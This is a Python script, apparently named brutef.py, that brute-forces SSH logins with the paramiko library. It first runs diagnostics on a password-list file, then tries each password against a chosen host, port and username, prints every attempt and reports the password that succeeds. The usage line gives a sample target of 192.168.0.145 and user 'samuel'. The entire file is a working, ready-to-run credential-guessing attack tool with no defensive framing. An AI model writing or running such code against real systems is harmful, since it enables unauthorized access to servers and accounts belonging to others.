import paramiko
import sys
import socket
import os
from paramiko.ssh_exception import AuthenticationException, SSHException

def extensive_file_debugging(filepath):
    """Perform comprehensive file diagnostics."""
    print("=== Extensive File Debugging ===")
    print(f"Attempting to access file: {filepath}")
    
    # Check if we're in the right directory
    print(f"Current working directory: {os.getcwd()}")
    
    # Check if the file exists
    if not os.path.exists(filepath):
        print(f"[CRITICAL] File does not exist: {filepath}")
        
        # Check parent directory
        parent_dir = os.path.dirname(filepath)
        print(f"\nParent directory: {parent_dir}")
        
        # List contents of parent directory
        try:
            print("Contents of parent directory:")
            for item in os.listdir(parent_dir):
                print(f"- {item}")
        except Exception as e:
            print(f"Could not list directory contents: {e}")
        
        # Check directory permissions
        print(f"\nParent directory permissions: {oct(os.stat(parent_dir).st_mode)[-3:]}")
        
        return False
    
    # File exists - check details
    print("[SUCCESS] File exists!")
    
    # File size and permissions
    print(f"File size: {os.path.getsize(filepath)} bytes")
    print(f"File permissions: {oct(os.stat(filepath).st_mode)[-3:]}")
    
    # Try to read the file
    try:
        with open(filepath, 'r') as f:
            lines = f.readlines()
            print(f"Number of lines in file: {len(lines)}")
            print("First few lines:")
            for line in lines[:5]:
                print(f"  {line.strip()}")
    except Exception as e:
        print(f"[ERROR] Could not read file: {e}")
        return False
    
    return True

def brute_force_ssh(host, port, username, password_file):
    # Extensive file debugging
    if not extensive_file_debugging(password_file):
        print("[FATAL] Cannot proceed due to file access issues")
        return

    try:
        with open(password_file, "r") as passwords:
            password_list = passwords.readlines()
            print(f"Total passwords to try: {len(password_list)}")
            
            for password in password_list:
                password = password.strip()
                if not password:  # Skip empty lines
                    continue
                
                try:
                    print(f"[INFO] Attempting SSH connection:")
                    print(f"  Host: {host}")
                    print(f"  Port: {port}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                    
                    # Create an SSH client
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # Attempt connection
                    client.connect(host, 
                                   port=port, 
                                   username=username, 
                                   password=password, 
                                   timeout=0.1)
                    
                    print(f"[SUCCESS] Password found: {password}")
                    client.close()
                    return
                
                except AuthenticationException:
                    print(f"[FAILED] Invalid password: {password}")
                except SSHException as e:
                    print(f"[ERROR] SSH error: {e}")
                except socket.error as se:
                    print(f"[ERROR] Connection error: {se}")
                    break  # Stop if network is unreachable
    
    except Exception as e:
        print(f"[CRITICAL] Unexpected error: {e}")

def main():
    # Validate command-line arguments
    if len(sys.argv) != 5:
        print("Usage: python brutef.py <host> <port> <username> <password_file>")
        print("Example: python brutef.py 192.168.0.145 22 samuel /path/to/passwords.txt")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    username = sys.argv[3]
    password_file = sys.argv[4]

    brute_force_ssh(target_host, target_port, username, password_file)

if __name__ == "__main__":
    main()
